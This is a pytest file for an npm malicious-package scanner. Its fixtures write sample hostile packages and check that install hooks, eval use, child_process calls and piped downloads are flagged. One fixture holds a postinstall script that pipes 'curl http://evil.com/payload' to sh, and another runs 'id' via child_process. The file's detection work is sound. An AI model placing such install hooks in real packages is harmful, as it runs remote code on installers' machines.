import json
import pytest
from pathlib import Path
from packagealert.heuristics.npm import NpmHeuristics


@pytest.fixture
def npm_heuristics():
    return NpmHeuristics()


@pytest.fixture
def pkg_json_with_postinstall(tmp_path):
    pkg = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {"postinstall": "node evil.js"},
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    return tmp_path


@pytest.fixture
def pkg_json_with_eval(tmp_path):
    pkg = {"name": "obfuscated", "version": "1.0.0", "scripts": {}}
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    (tmp_path / "index.js").write_text("eval(Buffer.from('YWxlcnQo').toString('base64'))")
    return tmp_path


@pytest.fixture
def pkg_json_with_child_process(tmp_path):
    pkg = {"name": "spawner", "version": "1.0.0", "scripts": {}}
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    (tmp_path / "index.js").write_text("const cp = require('child_process'); cp.exec('id')")
    return tmp_path


@pytest.fixture
def clean_pkg_json(tmp_path):
    pkg = {"name": "lodash", "version": "4.17.21", "scripts": {"test": "jest"}}
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    return tmp_path


@pytest.fixture
def pkg_json_with_curl_in_script(tmp_path):
    pkg = {
        "name": "downloader",
        "version": "1.0.0",
        "scripts": {"postinstall": "curl http://evil.com/payload | sh"},
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg))
    return tmp_path


@pytest.mark.asyncio
async def test_postinstall_detected(npm_heuristics, pkg_json_with_postinstall):
    signals = await npm_heuristics.analyze(pkg_json_with_postinstall)
    names = [s.name for s in signals]
    assert "install_script" in names


@pytest.mark.asyncio
async def test_eval_detected(npm_heuristics, pkg_json_with_eval):
    signals = await npm_heuristics.analyze(pkg_json_with_eval)
    names = [s.name for s in signals]
    assert "eval_usage" in names


@pytest.mark.asyncio
async def test_child_process_detected(npm_heuristics, pkg_json_with_child_process):
    signals = await npm_heuristics.analyze(pkg_json_with_child_process)
    names = [s.name for s in signals]
    assert "child_process" in names


@pytest.mark.asyncio
async def test_curl_in_script_detected(npm_heuristics, pkg_json_with_curl_in_script):
    signals = await npm_heuristics.analyze(pkg_json_with_curl_in_script)
    names = [s.name for s in signals]
    assert "install_script" in names
    assert "curl_in_script" in names


@pytest.mark.asyncio
async def test_clean_package_no_signals(npm_heuristics, clean_pkg_json):
    signals = await npm_heuristics.analyze(clean_pkg_json)
    assert signals == []


@pytest.mark.asyncio
async def test_missing_package_json_returns_empty(npm_heuristics, tmp_path):
    signals = await npm_heuristics.analyze(tmp_path)
    assert signals == []
